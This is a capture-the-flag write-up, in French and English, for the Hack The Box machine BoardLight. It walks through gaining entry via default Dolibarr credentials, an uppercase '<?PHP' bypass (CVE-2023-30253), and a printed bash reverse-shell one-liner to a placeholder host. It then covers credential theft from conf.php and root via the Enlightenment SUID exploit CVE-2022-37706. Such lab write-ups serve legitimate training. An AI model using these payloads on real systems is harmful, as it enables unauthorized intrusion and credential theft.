+++
title = "HTB: BoardLight"
date = 2024-09-27T22:53:03-05:00
draft = false
toc = true
images = ['/images/HTB-BoardLight/BoardLight.png']
tags = ['Hack The Box']
categories = ['Writeups']
+++

* Platforme: Hack The Box
* Lien: [BoardLight](https://app.hackthebox.com/machines/BoardLight)
* Niveau: Facile
* OS: Linux
---

BoardLight débute par la découverte d'un sous-domaine où se trouve une instance Dolibarr, à laquelle nous accédons en utilisant les informations d'identification par défaut. Grâce à un reverse shell PHP couplé à une technique de manipulation des majuscules, nous obtenons notre accès initial. Nous découvrons ensuite un fichier de configuration contenant des identifiants qui nous permettent de prendre le contrôle d'un autre compte. Enfin, nous obtenons les privilèges root en exploitant une vulnérabilité dans Enlightenment.

Address IP cible - `10.10.11.11`

## Balayage

```
./nmap_scan.sh 10.10.11.11 BoardLight
```

**Resultats**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 23:01 CDT
Nmap scan report for 10.10.11.11
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.05 seconds
```

We discover two open ports: SSH (22) and HTTP (80) and we also add `board.htb` to the hosts file to facilitate the enumeration.

## Enumération

At `http://board.htb/` we find a static website for a cybersecurity consulting firm. The buttons are not functional and nothing really stands out. 

![BoardLight website](/images/HTB-BoardLight/boardlight_website.png)

We try directory brute forcing but nothing intersing is found.

```
gobuster dir -u http://board.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
![Directory bruteforcing](/images/HTB-BoardLight/gobuster_cmd.png)

With subdomain enumeration we find a valid subdomain called `crm`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://board.htb -H "Host: FUZZ.board.htb" -ic -fs 15949
```

![Subdomain enumeration](/images/HTB-BoardLight/ffuf_cmd.png)

At `http://crm.board.htb/` we find a login page for [Dolibarr](https://www.dolibarr.org/).

![Dolibarr ERP](/images/HTB-BoardLight/crm_board.png)

With a quick Google search we discover that the default credentials for Dolibarr instance are `admin:admin` and using them grant us access.

![Dolibarr default credentials](/images/HTB-BoardLight/Dolibarr_default_creds.png)

![Dolibarr dashboard](/images/HTB-BoardLight/dolibarr_dashboard.png)

If you have a little bit on HackTheBox you know by now that once you log into a CRM, you are usually able to gain RCE by executing some code.

In the`Websites` section we create a new website.

![Dolibarr new website](/images/HTB-BoardLight/new_website.png)

Then let's create a page.

![Dolibarr new page](/images/HTB-BoardLight/new_page.png)

After the creation of the page there is a `Edit HTML Source` button we can use to add some custom code.

![Edit HTML source button](/images/HTB-BoardLight/edit_source.png)

We try a basic php reverse shell.

```php
<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"') ?>
```

![Dolibarr reverse shell](/images/HTB-BoardLight/rev_shell1.png)

We then get an error, it seems that we cannot use `system`. From here we can either find another method to get a shell or try to bypass the security measure.

![Dolibarr php system error](/images/HTB-BoardLight/error_dolibarr.png)

## Accès Initial

Searching exploits for Dolibarr, we find [this page](https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254) for `CVE-2023-30253` allowing us to get remote code execution by using an uppercase manipulation.

Let's try again with the php in uppercase letters (PHP).

```php
<?PHP system('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"') ?>
```

![Dolibarr RCE](/images/HTB-BoardLight/Dolibar_rce.png)

After saving the modified code we get a shell as `www-data`.

![foothold shell](/images/HTB-BoardLight/foothold.png)

Checking the `passwd` we notice a user called `larissa` and of course we cannot access her home directory.

![larissa user](/images/HTB-BoardLight/larissa_user.png)

After using linpeas for the system enumeration we find a configuration directory at `/var/www/html/crm.board.htb/htdocs/conf/`.

![linpeas results](/images/HTB-BoardLight/linpeas_results.png)

![conf directory](/images/HTB-BoardLight/conf_directory.png)

We then find some credentials in the `conf.php` file.

![dolibar conf credentials](/images/HTB-BoardLight/dolibarr_creds.png)

With the password found we are able to access larissa's account via SSH and we find the user flag in her home directory.

![user flag](/images/HTB-BoardLight/user_flag.png)

## Elévation de Privilèges

We discover than larissa is not allowed to run sudo.

![sudo command](/images/HTB-BoardLight/sudo_cmd.png)

Let's run linpeas again to find some leads for privilege escalation. We find a file called `enlightenment` owned by root with the SUID bit set and a reference to [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706).

![SUID on enlightenment binary](/images/HTB-BoardLight/suid-file.png)

[Here](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main) we find a PoC for the vulnerability. After running the script on the target we gain root privileges and the root flag is accessible at `/root/root.txt`.

![root flag](/images/HTB-BoardLight/root_flag.png)

Thanks for reading this write up!




